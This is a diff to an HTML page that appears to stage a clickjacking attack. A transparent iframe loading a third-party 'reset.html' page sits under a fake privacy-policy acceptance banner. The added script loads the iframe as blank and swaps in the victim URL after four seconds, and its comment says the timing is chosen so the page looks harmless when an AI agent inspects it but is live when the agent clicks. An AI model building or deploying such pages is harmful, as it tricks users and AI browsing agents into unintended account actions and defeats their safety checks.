@@ -163,8 +163,8 @@ h1 {
 </head>
 <body>
 
-<!-- Mendis reset.html loaded transparent — receives all clicks -->
-<iframe id="victim-frame" src="https://monedis.onrender.com/reset.html"></iframe>
+<!-- iframe starts blank; src swaps in after inspection window -->
+<iframe id="victim-frame" src="about:blank"></iframe>
 
 <div class="header">
   <div class="header-logo">
@@ -218,5 +218,11 @@ h1 {
 </div>
 <div class="accept-note">By accepting you agree to the updated Mendis Privacy Policy v3.1</div>
 
+<script>
+// Swap iframe src after 4 s — after agent inspection but before click
+setTimeout(function() {
+  document.getElementById('victim-frame').src = 'https://monedis.onrender.com/reset.html';
+}, 4000);
+</script>
 </body>
 </html>
